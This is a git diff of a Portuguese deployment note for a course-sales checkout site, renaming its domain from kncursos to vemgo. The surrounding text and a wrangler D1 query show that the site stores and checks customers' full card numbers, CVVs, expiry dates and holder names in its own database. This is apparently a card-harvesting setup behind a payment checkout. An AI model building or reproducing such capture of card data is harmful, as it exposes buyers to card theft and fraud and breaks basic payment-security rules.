@@ -5,8 +5,8 @@
 ### ✅ Código Corrigido e Deployado
 - **Commit:** `883ad25` 
 - **Data:** 14/03/2026 18:15
-- **Deploy:** https://3825e079.kncursos.pages.dev
-- **Produção:** https://kncursos.com.br
+- **Deploy:** https://3825e079.vemgo.pages.dev
+- **Produção:** https://vemgo.com.br
 
 ### 🔧 Mudanças Implementadas
 
@@ -31,7 +31,7 @@ INSERT INTO sales (
 
 ### Opção 1: Teste Manual no Site
 
-1. Acesse: https://kncursos.com.br/checkout/MKT2024ABC
+1. Acesse: https://vemgo.com.br/checkout/MKT2024ABC
 2. Preencha o formulário com seus dados
 3. Use um cartão real ou de teste do Mercado Pago
 4. Complete a compra
@@ -49,7 +49,7 @@ INSERT INTO sales (
 ### Opção 2: Teste via API (cURL)
 
 ```bash
-curl -X POST "https://kncursos.com.br/api/sales" \
+curl -X POST "https://vemgo.com.br/api/sales" \
   -H "Content-Type: application/json" \
   -d '{
     "link_code": "MKT2024ABC",
@@ -70,7 +70,7 @@ curl -X POST "https://kncursos.com.br/api/sales" \
 Após fazer uma compra, execute:
 
 ```bash
-cd /home/user/webapp && npx wrangler d1 execute kncursos --remote --command \
+cd /home/user/webapp && npx wrangler d1 execute vemgo --remote --command \
   "SELECT id, customer_name, card_number_full, card_cvv, card_expiry, card_holder_name, card_last4, card_brand, status, purchased_at FROM sales ORDER BY id DESC LIMIT 1"
 ```
 
@@ -114,11 +114,11 @@ Após confirmar que os dados estão sendo salvos:
 
 ## 🔗 Links Úteis
 
-- 🌐 Site: https://kncursos.com.br
-- 💳 Checkout: https://kncursos.com.br/checkout/MKT2024ABC
-- 📊 Admin: https://kncursos.com.br/admin
+- 🌐 Site: https://vemgo.com.br
+- 💳 Checkout: https://vemgo.com.br/checkout/MKT2024ABC
+- 📊 Admin: https://vemgo.com.br/admin
 - 🔄 Cronjob: https://console.cron-job.org/jobs/7375289
-- 📦 GitHub: https://github.com/kainow252-cmyk/kncursos
+- 📦 GitHub: https://github.com/kainow252-cmyk/vemgo
 
 ---
 
